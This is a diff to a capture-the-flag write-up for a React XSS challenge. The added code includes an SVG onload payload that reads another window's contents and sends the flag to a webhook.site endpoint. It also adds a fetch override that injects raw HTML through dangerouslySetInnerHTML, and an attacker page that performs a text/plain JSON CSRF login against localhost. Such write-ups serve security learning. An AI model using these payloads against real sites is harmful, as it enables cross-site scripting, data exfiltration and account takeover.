@@ -315,21 +315,41 @@ viewProgressStyle.dangerouslySetInnerHTML.__html
 A suitable payload is:
 
 ```js
-const HOOK = 'https://webhook.site/your-uuid';
+const HOOK = 'https://webhook.site/<Your-webhook-id>';
 
 const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg" onload="
 (()=>{ 
   const send = (m) => (new Image()).src='${HOOK}?x=' + encodeURIComponent(m) + '&t=' + Date.now();
+  send('xss-start:' + location.href);
   try {
     const w = window.open('', 'flagwin');
+    send('flagwin=' + (!!w));
     const txt = (w && w.document && w.document.body) ? w.document.body.innerText : 'NO_BODY';
+    send('txt=' + txt.slice(0,600));
     const m = txt.match(/PUCTF26\\{[A-Za-z0-9_]+_[A-Fa-f0-9]{32}\\}/);
-    send(m ? m[0] : txt.slice(0,500));
+    send(m ? ('FLAG=' + m[0]) : 'NOFLAG');
   } catch (e) {
     send('ERR=' + String(e));
   }
 })()
 "></svg>`;
+
+const origFetch = window.fetch;
+window.fetch = async (url, opts = {}) => {
+  if (typeof url === 'string' && url.includes('/api/profile/update')) {
+    const body = JSON.parse(opts.body);
+    body.viewProgressStyle = {
+      dangerouslySetInnerHTML: {
+        __html: PAYLOAD
+      }
+    };
+    opts.body = JSON.stringify(body);
+    window.fetch = origFetch;
+  }
+  return origFetch(url, opts);
+};
+
+alert('Click Update Profile');
 ```
 
 This payload:
@@ -337,7 +357,7 @@ This payload:
 - Reopens the named window `flagwin`
 - Reads `flagwin.document.body.innerText`
 - Extracts the flag with a regex
-- Sends it to our webhook
+- Sends it to our webhook and make sure your webhook receives the request
 
 ---
 
@@ -399,20 +419,40 @@ A practical form of the attacker page looks like this:
 ```html
 <!doctype html>
 <meta charset="utf-8">
-<title>react2xss</title>
+<title>react2xss-rush</title>
 <script>
+const HOOK = 'https://webhook.site/<your-webhook-id>';
 const LOCAL = 'http://localhost:3000';
-const USER = 'aaaabbbb';
-const PASS = 'aaaabbbbcc';
+const USER = 'ccccdddd';
+const PASS = 'ccccdddd11';
+
+function log(msg) {
+  new Image().src = HOOK + '?dbg=' + encodeURIComponent(msg) + '&t=' + Date.now();
+}
+
+function navHome(win, ms) {
+  setTimeout(() => {
+    try {
+      win.location = LOCAL + '/';
+      log('nav-home-' + ms);
+    } catch (e) {
+      log('nav-home-err-' + ms + '=' + e);
+    }
+  }, ms);
+}
 
 window.onload = () => {
-  // 1) Preserve admin profile JSON
+  log('page-start origin=' + location.origin);
+
+  // 1) Preserve admin profile JSON in a named window
   const flagwin = window.open(LOCAL + '/api/profile', 'flagwin');
+  log('flagwin-open=' + (!!flagwin));
 
-  // 2) Open a worker window
+  // 2) Open workwin directly to localhost/login
   const workwin = window.open(LOCAL + '/login', 'workwin');
+  log('workwin-open=' + (!!workwin));
 
-  // 3) Submit a text/plain form that becomes valid JSON
+  // 3) Quickly submit text/plain JSON CSRF
   setTimeout(() => {
     const form = document.createElement('form');
     form.method = 'POST';
@@ -422,21 +462,25 @@ window.onload = () => {
 
     const inp = document.createElement('input');
     inp.type = 'hidden';
-
-    // Attempt to construct a valid JSON body
     inp.name = `{"username":"${USER}","password":"${PASS}","x":"`;
     inp.value = '"}';
 
     form.appendChild(inp);
     document.body.appendChild(form);
-    form.submit();
+
+    try {
+      form.submit();
+      log('form-submitted');
+    } catch (e) {
+      log('form-submit-err=' + e);
+    }
   }, 150);
 
-  // 4) Repeatedly navigate workwin to /
-  setTimeout(() => { workwin.location = LOCAL + '/'; }, 800);
-  setTimeout(() => { workwin.location = LOCAL + '/'; }, 1500);
-  setTimeout(() => { workwin.location = LOCAL + '/'; }, 2500);
-  setTimeout(() => { workwin.location = LOCAL + '/'; }, 3500);
+  // 4) Repeatedly try to pull workwin back to / during bot's 5 second lifetime
+  navHome(workwin, 800);
+  navHome(workwin, 1500);
+  navHome(workwin, 2500);
+  navHome(workwin, 3500);
 };
 </script>
 ```
